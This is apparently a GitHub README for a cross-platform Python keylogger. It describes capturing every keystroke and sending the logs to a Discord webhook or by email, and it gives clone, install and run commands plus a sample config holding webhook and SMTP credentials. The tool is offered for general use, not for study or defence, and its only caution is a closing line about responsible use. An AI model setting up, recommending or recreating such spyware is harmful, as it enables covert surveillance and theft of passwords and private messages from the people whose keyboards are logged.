# Python Keylogger 🐍🔑

![Python Keylogger](https://img.shields.io/badge/Download-Release-brightgreen)

Welcome to the Python Keylogger repository! This project is designed to provide a simple yet effective keylogging solution across multiple operating systems, including Windows 10/11 and Linux. With this keylogger, you can capture keystrokes and send them via Discord webhook or email. 

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [How It Works](#how-it-works)
5. [Keylogger Configuration](#keylogger-configuration)
6. [Contributing](#contributing)
7. [License](#license)
8. [Support](#support)

## Features

- **Cross-Platform**: Works on Windows 10/11 and Linux.
- **Webhook Support**: Send captured data to a Discord webhook.
- **Email Notifications**: Receive logs via email.
- **Lightweight**: Minimal resource usage.
- **Easy to Use**: Simple setup and configuration.

## Installation

To get started, download the latest release from the [Releases section](https://github.com/Enrique202318/python-keylogger/releases). Once downloaded, extract the files and execute the main script.

### Requirements

- Python 3.x
- Required libraries (see the `requirements.txt` file)

### Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/Enrique202318/python-keylogger.git
   cd python-keylogger
   ```

2. Install the required libraries:
   ```bash
   pip install -r requirements.txt
   ```

3. Configure your webhook and email settings in the `config.py` file.

## Usage

To run the keylogger, execute the following command in your terminal or command prompt:

```bash
python keylogger.py
```

The keylogger will start capturing keystrokes and send them according to your configuration. Make sure to monitor your Discord webhook or email for the logs.

## How It Works

The keylogger works by hooking into the keyboard events of the operating system. It captures every keystroke made by the user and stores it temporarily. Based on the configuration, it can send the captured data either to a Discord webhook or via email.

### Keylogging Process

1. **Initialization**: The keylogger initializes and sets up the necessary hooks.
2. **Capture Keystrokes**: It listens for keyboard events and captures the data.
3. **Data Transmission**: The captured data is sent to the specified webhook or email address.

## Keylogger Configuration

You can customize the keylogger by editing the `config.py` file. Here are the main configuration options:

- **Webhook URL**: Set the Discord webhook URL where logs will be sent.
- **Email Settings**: Configure the SMTP settings for email notifications.
- **Log Frequency**: Set how often the logs should be sent (e.g., every 5 minutes).

### Example Configuration

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"
LOG_FREQUENCY = 5  # in minutes
```

## Contributing

We welcome contributions! If you want to improve the project, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

For any questions or issues, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/Enrique202318/python-keylogger/releases) for updates and downloads.

## Conclusion

Thank you for checking out the Python Keylogger! We hope you find it useful for your needs. Remember to use this tool responsibly and ethically. Happy coding!